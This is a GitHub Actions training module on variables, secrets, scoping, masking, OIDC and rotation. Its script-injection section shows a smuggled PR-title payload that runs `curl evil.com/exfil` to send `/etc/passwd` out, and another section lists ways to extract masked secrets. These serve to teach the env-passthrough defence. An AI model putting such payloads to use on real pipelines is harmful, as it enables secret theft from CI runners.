# 23 — Variables, secrets, env scoping

> *"Secrets are encrypted at rest, masked in logs, and never sent to PRs from forks. Variables are the same minus the encryption. Understand which is which."*

## Why this module exists

The credential surface inside a workflow is the most-incident-prone area of GitHub Actions. This module covers secrets (encrypted) vs variables (cleartext), scopes (org / repo / environment), and the env-passing patterns that prevent shell injection.

---

## 1. Variables vs Secrets

| | Variables | Secrets |
|---|---|---|
| Storage | Plain text (encrypted at rest but visible in UI to those with access) | Encrypted; never displayed after creation |
| Logged | Yes (echoed in logs visibly) | **Masked** in logs (replaced with `***`) |
| Available to PR-from-fork | Yes | **No** (since GHSA-3xrf-vrqh-7qxq lockdown) |
| Editable in UI | Yes (can read value) | Cannot read; can only overwrite |
| Use for | Non-secret config: API URLs, regions, feature flags | API keys, tokens, certs, passwords |

Set via UI: Settings → Secrets and variables → Actions → Variables / Secrets.

Set via CLI:

```bash
# Variables
gh variable set AWS_REGION --body "us-east-1"
gh variable set AWS_REGION --org capitalone --visibility selected --repos repo1,repo2

# Secrets
gh secret set GH_TOKEN                       # prompts for value
gh secret set DB_PASSWORD --body "$DB_PWD"
gh secret set DEPLOY_KEY < ~/.ssh/deploy_key
gh secret set MY_TOKEN --env staging         # environment-scoped
```

---

## 2. The three scopes

```
Organization
   ├── Variable / Secret (visible to all repos or selected repos)
   │
   └── Repository
        ├── Variable / Secret (visible only to this repo)
        │
        └── Environment
             └── Variable / Secret (visible only when job runs in this environment)
```

Resolution order when a secret/variable is referenced: **environment > repository > organization**. A repo-scoped `AWS_REGION` overrides org-scoped `AWS_REGION`.

For each scope:
- **Organization**: defined once, used by many repos. Set "Repository access" to All / Private only / Selected.
- **Repository**: per-repo.
- **Environment**: per-environment (e.g., `staging`, `prod`). Requires defining an environment in repo Settings → Environments. The killer combo: environment-scoped secrets + protection rules (manual approval, deployment branches). See [module 30](30_actions_environments_protection.md).

---

## 3. Where to put what

| Type | Scope |
|---|---|
| `AWS_ACCOUNT_ID` (per env) | Environment variable |
| `AWS_REGION` (org standard) | Org variable |
| `GHCR_TOKEN` (universal bot) | Org secret |
| `SLACK_WEBHOOK` (one channel per repo) | Repo secret |
| `PROD_DEPLOY_ROLE_ARN` | Environment secret on `prod` |
| `STAGING_DEPLOY_ROLE_ARN` | Environment secret on `staging` |
| `DATABASE_URL` (per env, different per repo) | Environment secret |
| `PYTHON_VERSION` (workflow standard) | Workflow env (in YAML), NOT a variable |

The rule of thumb: **anything sensitive → secret. Anything that varies by environment → environment-scoped. Anything cross-repo → org-scoped.**

---

## 4. Accessing in workflows

```yaml
env:                                       # workflow-level env (cleartext)
  AWS_REGION: ${{ vars.AWS_REGION }}       # from org or repo variable
  PYTHON_VERSION: "3.11"                   # static

jobs:
  deploy:
    environment: prod                       # binds environment-scoped secrets/vars
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.PROD_DEPLOY_ROLE_ARN }}   # env variable
          aws-region: ${{ env.AWS_REGION }}
      - run: aws s3 cp ./artifact.zip s3://${{ vars.PROD_BUCKET }}/
        env:
          API_KEY: ${{ secrets.API_KEY }}                     # env secret
```

The `environment: prod` line is what makes the `prod` environment's scoped secrets + variables visible to this job. Without it, only repo/org scope applies.

---

## 5. Secret masking

GitHub auto-masks secret values in logs. If your code echoes a secret, the log shows `***` instead of the value.

```yaml
- run: echo "Token: ${{ secrets.API_TOKEN }}"
# Log output: "Token: ***"
```

**But masking is not security.** A motivated attacker can extract secrets via:
- Base64-encoding the secret and printing (the encoded string isn't masked)
- Writing to a file then reading the file
- Sending the secret to an external server via curl

Don't `echo` secrets even casually. Don't print env at the top of scripts. If you must debug, use `runner.debug` logging which is gated by user opt-in.

To explicitly mask a custom value:

```yaml
- run: |
    DERIVED=$(generate-something)
    echo "::add-mask::$DERIVED"
```

The `::add-mask::` workflow command tells the runner to mask the value in subsequent logs.

---

## 6. Multi-line secrets

For multi-line secrets (private keys, certs), the value is stored as-is. Reference normally:

```bash
gh secret set DEPLOY_KEY < ~/.ssh/deploy_key
```

In workflow:

```yaml
- name: Setup SSH
  run: |
    mkdir -p ~/.ssh
    echo "${{ secrets.DEPLOY_KEY }}" > ~/.ssh/id_ed25519
    chmod 600 ~/.ssh/id_ed25519
```

For JSON secrets (service account keys), reference as a JSON string:

```yaml
- name: Setup GCP
  run: echo '${{ secrets.GCP_SA_KEY }}' > /tmp/key.json
- uses: google-github-actions/auth@v2
  with:
    credentials_json: ${{ secrets.GCP_SA_KEY }}
```

---

## 7. The OIDC alternative — no secrets at all (preferred)

For cloud auth (AWS, Azure, GCP, HashiCorp Vault, etc.), **prefer OIDC over long-lived secrets**.

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/github-actions-deployer
      aws-region: us-east-1
  # No AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY needed
  - run: aws s3 ls
```

The runner exchanges a workflow-scoped OIDC JWT for AWS temporary credentials. No long-lived secret ever stored. See [module 29](29_actions_oidc_aws.md) for the full pattern.

This is the **canonical pattern at Capital One**. Storing long-lived AWS access keys as Actions secrets is an anti-pattern in 2026.

---

## 8. Script injection — the must-fix CVE pattern

**The vulnerable pattern**:

```yaml
- run: |
    echo "Reviewing PR: ${{ github.event.pull_request.title }}"
```

If the PR title is `"; curl evil.com/exfil -d "$(cat /etc/passwd)"; echo "`, the shell interpolation produces:

```bash
echo "Reviewing PR: "; curl evil.com/exfil -d "$(cat /etc/passwd)"; echo ""
```

→ Arbitrary command execution in the runner. If the runner had secrets, those are exfiltrated.

**The fix — env passthrough**:

```yaml
- run: |
    echo "Reviewing PR: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

Now `$TITLE` is a shell variable, not template-substituted. Shell metacharacters in the value are literal text.

**Affected fields** (user-controllable strings):
- `github.event.pull_request.title`, `.body`
- `github.event.issue.title`, `.body`
- `github.event.comment.body`
- `github.head_ref` (branch name)
- `github.event.workflow_run.head_branch`
- `github.event.commits.*.message`, `.*.author.email`, `.*.author.name`

Anything user-controllable. Use env-passthrough for all of them.

Run `zizmor` (pip install zizmor) or `actionlint` to catch this pattern.

---

## 9. Common patterns by use case

### Database URL per environment

```yaml
jobs:
  deploy:
    environment: ${{ inputs.env }}
    steps:
      - run: alembic upgrade head
        env:
          DATABASE_URL: ${{ secrets.DATABASE_URL }}  # env-scoped: different value per env
```

### Build-time secret (npm/pip)

```yaml
- name: Configure pip
  run: pip config set global.index-url "https://__token__:${{ secrets.PYPI_TOKEN }}@pypi.example.com/simple"
- run: pip install -e ".[dev]"
```

### Cross-step secret (avoid if possible)

```yaml
- id: derive
  run: |
    KEY=$(get-something)
    echo "::add-mask::$KEY"
    echo "key=$KEY" >> $GITHUB_OUTPUT
- run: use-it
  env:
    KEY: ${{ steps.derive.outputs.key }}
```

`$GITHUB_OUTPUT` writes to a runner-local file; the value is masked only if you `::add-mask::` first.

### Bot identity via GitHub App

See [module 12](12_auth_pat_ssh_signing.md) — App tokens are short-lived (1 hour) and scoped, much better than PATs.

```yaml
- uses: actions/create-github-app-token@v1
  id: token
  with:
    app-id: ${{ vars.MY_APP_ID }}
    private-key: ${{ secrets.MY_APP_PRIVATE_KEY }}
- run: gh pr review --approve 123
  env:
    GH_TOKEN: ${{ steps.token.outputs.token }}
```

---

## 10. Secret rotation

Periodic secret rotation is required by most compliance regimes:

- **GHAS Secret Protection** detects leaks but doesn't rotate.
- **External rotation services** (AWS Secrets Manager, HashiCorp Vault) generate new secrets on a schedule. Push new value to GitHub via API.
- **OIDC eliminates the need for cloud-credential rotation** — credentials are 1-hour ephemeral. Use it.
- **GitHub Apps** auto-rotate (1-hour tokens).
- **Long-lived secrets** (third-party API keys with no OIDC support): rotate quarterly via runbook + audit-logged change.

Use the audit log to verify all secrets have been rotated within compliance window.

---

## 11. Cross-references

- OIDC to AWS (the no-secret alternative) → [module 29](29_actions_oidc_aws.md).
- Environments + manual approvals → [module 30](30_actions_environments_protection.md).
- GitHub Apps for bot identity → [module 12](12_auth_pat_ssh_signing.md), [module 52](52_apps_webhooks_ghcli_graphql.md).
- Secret scanning + push protection → [module 32](32_ghas_secret_scanning.md).
- Script injection prevention via env-passthrough → covered above; lint with `zizmor`.
